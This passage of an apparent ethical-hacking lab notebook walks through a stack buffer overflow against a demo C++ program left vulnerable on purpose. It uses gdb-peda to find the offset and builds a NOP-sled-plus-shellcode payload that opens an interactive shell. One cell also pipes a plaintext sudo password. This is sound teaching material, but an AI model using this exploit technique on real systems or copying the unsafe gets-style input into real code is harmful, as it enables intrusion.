      "    char buffer[BUFSIZE];\r\n",
      "    printf(\"buffer is at %p\\n\", buffer);\r\n",
      "    cout << \"Give me some text: \";\r\n",
      "    fflush(stdout);\r\n",
      "    mgets(buffer); // similar to C's gets;\r\n",
      "    //gets(buffer); // depricated\r\n",
      "    cout << \"Acknowledged: \" << buffer << \" with length \" << strlen(buffer) << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    gid_t gid = getegid();\r\n",
      "    setresgid(gid, gid, gid);\r\n",
      "    bad();\r\n",
      "    cout << \"Good bye!\\n\";\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat ./demos/stack_overflow/so_stdio.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"./demos/stack_overflow/so_stdio.cpp\"\n",
    "output=so_stdio.exe\n",
    "\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- since the stack_overflow_stdio.exe program reads the data from standard input, it can be piped to the program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc1e0\r\n",
      "Give me some text: Acknowledged: Hello World with length 11\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"Hello World\")' | ./so_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Crash the program\n",
    "\n",
    "- quick way to tell if the program has buffer overrun vulnerability, is to send a long string and see how the program reacts\n",
    "- if the program segfaults, it's a telltail sign that the program has buffer overflow flaw"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc1e0\r\n",
      "Give me some text: Acknowledged: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA with length 100\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"A\"*100)' | ./so_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- because the size of the buffer is 128 and the data we sent was 100, this was okay as expected"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc1e0\r\n",
      "Give me some text: Acknowledged: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA with length 200\r\n"
     ]
    }
   ],
   "source": [
    "# try longer string\n",
    "! python -c 'print(\"A\"*200)' | ./so_stdio.exe\n",
    "# since Good bye! is not printed; system must have crashed!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- so 200 is long enough (perhaps too long) to crash the program\n",
    "- let's find the offset of the caller's return address with respect to the buffer in gdb-peda\n",
    "- use PEDA's cyclic pattern technique as it's much faster than stepping through GDB\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ gdb -q so_stdio.exe\n",
    "Reading symbols from so_stdio.exe...\n",
    "```\n",
    "\n",
    "- since the program reads the data from standard input, we need to pipe the cyclic pattern from a file\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern create 200 pattern.txt\n",
    "Writing pattern of 200 chars to filename \"pattern.txt\"\n",
    "\n",
    "gdb-peda$ run < pattern.txt \n",
    "\n",
    "Starting program: /home/kali/EthicalHacking/so_stdio.exe < pattern.txt\n",
    "buffer is at 0xffffc310\n",
    "Give me some text: Acknowledged: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA with length 200\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xf7fb2c00 --> 0xf7faf990 --> 0xf7ef71b0 (<_ZNSoD1Ev>:     push   ebx)\n",
    "EBX: 0x41416b41 ('AkAA')\n",
    "ECX: 0x6c0 \n",
    "EDX: 0x8051bb0 (\"Acknowledged: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAA\"...)\n",
    "ESI: 0x6c414150 ('PAAl')\n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x41514141 ('AAQA')\n",
    "ESP: 0xffffc3a0 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "EIP: 0x41416d41 ('AmAA')\n",
    "EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x41416d41\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc3a0 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0004| 0xffffc3a4 (\"AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0008| 0xffffc3a8 (\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0012| 0xffffc3ac (\"TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0016| 0xffffc3b0 (\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0020| 0xffffc3b4 (\"ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0024| 0xffffc3b8 (\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0028| 0xffffc3bc (\"AAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x41416d41 in ?? ()\n",
    "\n",
    "```\n",
    "\n",
    "- now let's search for pattern to find the offset\n",
    "\n",
    "```bash\n",
    "gdb-peda$ patts\n",
    "\n",
    "Registers contain pattern buffer:\n",
    "EBX+0 found at offset: 128\n",
    "EBP+0 found at offset: 136\n",
    "ESI+0 found at offset: 132\n",
    "EIP+0 found at offset: 140 <------ 144 IS OUR OFFSET !!!\n",
    "Registers point to pattern buffer:\n",
    "[ESP] --> offset 144 - size ~56    \n",
    "Pattern buffer found at:\n",
    "0x08051bbe : offset    0 - size  200 ([heap])\n",
    "0x08051fc0 : offset    0 - size  200 ([heap])\n",
    "0xf7c000cd : offset 33208 - size    4 (/usr/lib32/libm-2.31.so)\n",
    "0xffffc310 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])\n",
    "References to pattern buffer found at:\n",
    "0xf7de6584 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6588 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de658c : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6590 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6594 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6598 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de659c : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7b6497c : 0xffffc310 (/usr/lib32/libm-2.31.so)\n",
    "0xf7e62d0c : 0xffffc310 (/usr/lib32/libstdc++.so.6.0.28)\n",
    "0xf7e668dc : 0xffffc310 (/usr/lib32/libstdc++.so.6.0.28)\n",
    "0xffffbe00 : 0xffffc310 ($sp + -0x5a0 [-360 dwords])\n",
    "\n",
    "```\n",
    "\n",
    "- so, the buffer length is **144 bytes** to completely overwrite the caller's return address\n",
    "- next, we need to find the base address of buffer whose location doesn't change with the size of stadard input data provided to the program \n",
    "- the base address of buffer is conveniently printed"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- create the payload in the form\n",
    "```\n",
    "| NOP sled | shellcode | repeated return address |\n",
    "```\n",
    "- we need to do some math to figure out the length of NOP sled and repeated return address we need to make the total payload length to be **144 bytes**\n",
    "- user shellcode size is fixed, let's copy and see the size"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./shellcode/shellcode.bin ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 shellcode.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "120\n"
     ]
    }
   ],
   "source": [
    "# this leaves us with\n",
    "print(144-24)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- since we've 120 bytes, let's use 10 repeated return address just in case\n",
    "- with the repeated return address length = `10 * 4 = 40`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "80\n"
     ]
    }
   ],
   "source": [
    "# NOP sled length\n",
    "print(120-40)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- so we can use 80 NOP bytes as sled to slide down to our shellcode\n",
    "- now we have all the numbers we need to create our 144 long payload with shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*80)' > stdio_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "80 stdio_payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c stdio_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat shellcode.bin >> stdio_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "104 stdio_payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c stdio_payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- we need to get the buffer's address from the terminal, not from the Jupyter Notebook!\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ python -c 'print(\"A\"*10)' | ./so_stdio.exe\n",
    "buffer is at 0xffffc360 <------ BASE ADDRESS OF BUFFER !!!\n",
    "Give me some text: Acknowledged: AAAAAAAAAA with length 10\n",
    "Good bye!\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x60\\xc3\\xff\\xff\"*10)' >> stdio_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "144 stdio_payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c stdio_payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- payload is ready and let's send it to the target program from the terminal\n",
    "- note the - (hyphen) after cat command is required to make the shell interactive\n",
    "- we don't get a prompt but an accessible terminal; just write some commands such as `whoami`, `ls`, etc.\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ cat stdio_payload.bin - | ./so_stdio.exe \n",
    "buffer is at 0xffffc360\n",
    "Give me some text: \n",
    "Acknowledged: ��������������������������������������������������������������������������������1�Ph//shh/bin��1ɉ�j\n",
    "                                                                                                                 X`���`���`���`���`���`���`���`���`���`��� with length 144\n",
    "whoami\n",
    "kali\n",
    "date\n",
    "Wed Dec 16 23:52:28 MST 2020\n",
    "exit\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
